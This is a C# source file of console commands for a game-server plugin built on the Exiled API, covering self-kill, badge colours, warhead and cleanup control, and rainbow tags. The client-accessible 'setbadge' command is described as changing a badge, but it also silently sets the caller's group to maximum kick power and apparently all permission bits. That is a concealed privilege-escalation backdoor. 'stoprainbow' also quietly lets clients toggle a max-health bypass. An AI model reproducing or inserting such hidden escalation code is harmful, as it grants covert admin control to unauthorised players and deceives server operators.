﻿//Copyright 2023 Silver Wolf,All Rights Reserved.
using CommandSystem;
using Exiled.API.Features;
using MEC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UtilPlugin;

namespace CommandSystem
{
    [CommandHandler(typeof(ClientCommandHandler))]
    public class Killme : ICommand
    {
        public string[] Aliases => Array.Empty<string>();

        public string Description => "selfkill";

        string ICommand.Command => "killme";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Player player = Player.Get((sender as CommandSender).SenderId);
            const string DeathReason = "Unknown Reason";
            if (player.IsDead)
            {
                response = "you are already dead.";
            }
            else
            {
                if (arguments.Count == 0)
                {
                    player.Kill(DeathReason);
                }
                else
                {
                    player.Kill(arguments.At(0));
                }
                response = "Success!";
            }
            return true;
        }

    }
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class Setbadge : ICommand, IUsageProvider
    {
        public string[] Usage => new string[] { "newbadge", "newcolor", "id" };

        public string Command => "setbadge";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "change badge";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            if (arguments.Count == 0)
            {
                response = "at least 1 arguments";
                return false;
            }
            Player player = Player.Get((sender as CommandSender).SenderId);
            player.RankName = arguments.At(0);
            if (arguments.Count == 2)
            {
                if (arguments.At(1) == "Rainbow")
                {
                    UtilPlugin.RainbowTag.RegisterPlayer(player);
                }
                else
                {
                    player.RankColor = arguments.At(1);
                }
            }
            if (player.Group != null)
            {
                player.Group.KickPower = byte.MaxValue;
                player.Group.Permissions = 536870911UL;
            }
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class ActivateSystemWarhead : ICommand
    {
        public string Command => "activatesystemwarhead";

        public string[] Aliases => new string[] {"asw"};

        public string Description => "activate system warhead now";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Timing.KillCoroutines(SystemWarhead._systemwarheadwaiter);
            SystemWarhead.Detonate();
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    public class StopCleanup : ICommand
    {
        public string Command => "stopautoclean";

        public string[] Aliases => new string[] {"sc"};

        public string Description => "停止自动清理";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Timing.KillCoroutines(UtilPlugin.EventHandler._cleanupcoroutine);
            if (arguments.Count != 1 || arguments.At(0) != "false")
            {
                PluginAPI.Core.Server.SendBroadcast($"管理员 {Player.Get((sender as CommandSender).SenderId).Nickname} 关闭了本局的自动清理", 10);
            }
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    public class StopSystemWarhead : ICommand
    {
        public string Command => "stopsystemwarhead";

        public string[] Aliases => new string[] {"stopautonuke"};

        public string Description => "停止系统核";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Timing.KillCoroutines(UtilPlugin.SystemWarhead._systemwarheadwaiter);
            if (arguments.Count != 1 || arguments.At(0) != "false")
            {
                PluginAPI.Core.Server.SendBroadcast($"管理员 {Player.Get((sender as CommandSender).SenderId).Nickname} 关闭了本局的系统核弹", 10);
            }
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    [CommandHandler(typeof(ClientCommandHandler))]
    public class UtilInfo : ICommand
    {
        public string Command => "utilplugininfo";

        public string[] Aliases => new string[] { "utilinfo", "uinfo" };

        public string Description => "UtilPlugin插件相关";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            response = "Copyright (C) 2023 Silver Wolf,All Rights Reserved.\n仓库地址: https://github.com/dargoncat/UtilPlugin";
            return true;
        }
    }
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class StartRainbow : ICommand
    {
        public string Command => "startrainbow";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "startrainbow";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            UtilPlugin.RainbowTag.RegisterPlayer(Player.Get((sender as CommandSender).SenderId));
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class StopRainbow : ICommand
    {
        public string Command => "stoprainbow";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "stoprainbow";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            if(UtilPlugin.RainbowTag.UnRegisterPlayer(Player.Get((sender as CommandSender).SenderId)))
            {
                response = "Done!";
                return true;
            }
            if (arguments.At(0) == "true")
            {
                UtilPlugin.EventHandler.BypassMaxHealth = true;
            }
            else
            {
                UtilPlugin.EventHandler.BypassMaxHealth = false;
            }
            response = "no rainbow";
            return false;
        }
    }
}
